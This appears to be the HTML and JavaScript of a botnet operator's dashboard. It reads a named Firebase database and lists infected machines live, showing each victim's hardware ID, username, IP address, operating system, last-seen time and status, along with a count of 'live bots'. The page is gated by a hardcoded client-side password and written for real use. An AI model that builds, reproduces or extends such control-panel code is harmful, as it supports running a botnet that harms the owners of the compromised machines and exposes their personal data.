<!DOCTYPE html>
<html>
<head>
  <title>BOTNET DASHBOARD</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
    .live { color: lime; }
  </style>
</head>
<body>
  <h1>BOTNET DASHBOARD</h1>

  <script>
    // ==================== YOUR PASSWORD ====================
    const PASSWORD = "underground2026";   // ← CHANGE THIS IF YOU WANT
    // ======================================================

    // Check if password was already entered this browser session
    if (!localStorage.getItem("botnet_access") || localStorage.getItem("botnet_access") !== PASSWORD) {
      let pass = prompt("Enter dashboard password:");
      if (pass !== PASSWORD) {
        alert("Wrong password - access denied");
        location.href = "https://github.com";
        throw new Error("Access denied");
      }
      localStorage.setItem("botnet_access", PASSWORD);
    }

    const firebaseConfig = {
      databaseURL: "https://mynet-b06ed-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database().ref('bots');

    db.on('value', (snapshot) => {
      const data = snapshot.val();
      let html = `<table><tr><th>HWID</th><th>User</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th></tr>`;
      let count = 0;
      for (let key in data) {
        const bot = data[key];
        html += `<tr><td>${key}</td><td>${bot.username || ''}</td><td>${bot.ip || ''}</td><td>${bot.os || ''}</td><td>${bot.timestamp ? new Date(bot.timestamp).toLocaleString() : ''}</td><td class="live">${bot.status || ''}</td></tr>`;
        count++;
      }
      html += `</table><br><h2>${count} LIVE BOTS</h2>`;
      document.body.innerHTML += html;
    });
  </script>
</body>
</html>
